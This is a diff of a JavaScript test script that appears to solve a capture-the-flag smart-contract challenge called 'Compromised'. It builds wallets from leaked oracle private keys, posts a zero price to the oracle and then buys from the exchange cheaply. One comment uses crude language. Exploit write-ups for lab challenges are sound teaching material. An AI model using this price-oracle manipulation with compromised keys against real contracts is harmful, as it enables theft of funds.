@@ -69,23 +69,16 @@ describe('Compromised challenge', function () {
         ]
         const wallets = [];
         for (let i = 0; i < passwords.length; i++) {
-
             // do something with this, just need to get a non void signer::  change 
             // "ethers.provider"  to w'e the fuck hardhat will supply from its network as a provider..... to @franz101
             const wallet = new ethers.Wallet(passwords[i],ethers.provider)
             wallets.push(wallet);
-            console.log("x")
-            let response = await wallet.sendTransaction({
-                to: this.exchange.address,
-             });
-             console.log("Y")
         }
 
         for (let i = 0; i < wallets.length; i++) {
-            console.log("xc")
 			await this.oracle.connect(wallets[i]).postPrice(tokenId, 0);
-            console.log("yc")
         }
+        console.log("price manipulated")
 		await this.exchange.connect(attacker).buyOne();
         console.log("Bought one")
 		let exchangeBalance = this.exchange.balance;
